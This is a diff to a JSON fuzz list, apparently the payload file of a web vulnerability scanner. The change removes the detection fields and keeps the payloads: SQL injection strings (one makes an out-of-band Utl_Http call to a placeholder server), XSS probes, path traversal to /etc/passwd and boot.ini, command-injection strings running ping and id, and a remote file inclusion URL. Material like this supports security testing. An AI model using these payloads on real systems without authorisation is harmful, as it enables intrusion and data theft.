@@ -2,183 +2,127 @@
    "fuzzList":[
       {
          "payload":"‘",
-         "type":"SQLi",
-         "observation":"1"
+         "type":"SQLi"
       },
       {
          "payload":"‘--",
-         "type":"SQLi",
-         "observation":"1"
+         "type":"SQLi"
       },
       {
          "payload":"‘ or 1=1--",
-         "type":"SQLi",
-         "observation":"1"
+         "type":"SQLi"
       },
       {
          "payload":"' or 1 in (@@version)--",
-         "type":"SQLi",
-         "observation":"1"
+         "type":"SQLi"
       },
       {
          "payload":"'; waitfor delay '0:30:0'--",
-         "type":"SQLi",
-         "observation":"2",
-         "delay":"0:30:0"
+         "type":"SQLi"
       },
       {
          "payload":"'||Utl_Http.request('http://<yourservername>') from dual--",
-         "type":"SQLi",
-         "observation":"3"
+         "type":"SQLi"
       },
       {
          "payload":"xsstest",
-         "type":"XSS",
-         "observation":"4",
-         "string":"xsstest"
+         "type":"XSS"
       },
       {
          "payload":"xsstest%00\"<>'",
-         "type":"XSS",
-         "observation":"4",
-         "string":"xsstest%00\"<>'"
+         "type":"XSS"
       },
       {
          "payload":"</foo>",
-         "type":"XSS",
-         "observation":"4",
-         "string":"</foo>"
+         "type":"XSS"
       },
       {
          "payload":"../../../../../../../../../../etc/passwd",
-         "type":"PT",
-         "observation":"4",
-         "string":"root"
+         "type":"PT"
       },
       {
          "payload":"../../../../../../../../../../boot.ini",
-         "type":"PT",
-         "observation":"4",
-         "string":"uid="
+         "type":"PT"
       },
       {
          "payload":"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
-         "type":"PT",
-         "observation":"4",
-         "string":"root"
+         "type":"PT"
       },
       {
          "payload":"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\boot.ini",
-         "type":"PT",
-         "observation":"4",
-         "string":"uid="
+         "type":"PT"
       },
       {
          "payload":"|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &",
-         "type":"CI",
-         "observation":"2",
-         "delay":"0:30:0"
+         "type":"CI"
       },
       {
          "payload":"| ping -i 30 127.0.0.1 |",
-         "type":"CI",
-         "observation":"2",
-         "delay":"0:30:0"
+         "type":"CI"
       },
       {
          "payload":"| ping -n 30 127.0.0.1 |",
-         "type":"CI",
-         "observation":"2",
-         "delay":"0:30:0"
+         "type":"CI"
       },
       {
          "payload":"& ping -i 30 127.0.0.1 &",
-         "type":"CI",
-         "observation":"2",
-         "delay":"0:30:0"
+         "type":"CI"
       },
       {
          "payload":"& ping -n 30 127.0.0.1 &",
-         "type":"CI",
-         "observation":"2",
-         "delay":"0:30:0"
+         "type":"CI"
       },
       {
          "payload":"; ping 127.0.0.1 ;",
-         "type":"CI",
-         "observation":"2",
-         "delay":"0:30:0"
+         "type":"CI"
       },
       {
          "payload":"%0a ping -i 30 127.0.0.1 %0a",
-         "type":"CI",
-         "observation":"2",
-         "delay":"0:30:0"
+         "type":"CI"
       },
       {
          "payload":"`ping 127.0.0.1`",
-         "type":"CI",
-         "observation":"2",
-         "delay":"0:30:0"
+         "type":"CI"
       },
       {
-         "payload":"| id",
-         "type":"CI",
-         "observation":"4",
-         "string":"whoami"
+         "payload": "| id",
+         "type": "CI"
       },
       {
          "payload":"& id",
-         "type":"CI",
-         "observation":"4",
-         "string":"whoami"
+         "type":"CI"
       },
       {
          "payload":"; id",
-         "type":"CI",
-         "observation":"4",
-         "string":"whoami"
+         "type":"CI"
       },
       {
          "payload":"%0a id %0a",
-         "type":"CI",
-         "observation":"4",
-         "string":"whoami"
+         "type":"CI"
       },
       {
          "payload":"`id`",
-         "type":"CI",
-         "observation":"4",
-         "string":"whoami"
+         "type":"CI"
       },
       {
          "payload":";echo 111111",
-         "type":"CI",
-         "observation":"4",
-         "string":"111111"
+         "type":"CI"
       },
       {
          "payload":"echo 111111",
-         "type":"CI",
-         "observation":"4",
-         "string":"111111"
+         "type":"CI"
       },
       {
          "payload":"response.write 111111",
-         "type":"CI",
-         "observation":"4",
-         "string":"111111"
+         "type":"CI"
       },
       {
          "payload":":response.write 111111",
-         "type":"CI",
-         "observation":"4",
-         "string":"111111"
+         "type":"CI"
       },
       {
          "payload":"http://<yourservername>/",
-         "type":"RFI",
-         "observation":"3"
+         "type":"RFI"
       }
    ]
 }
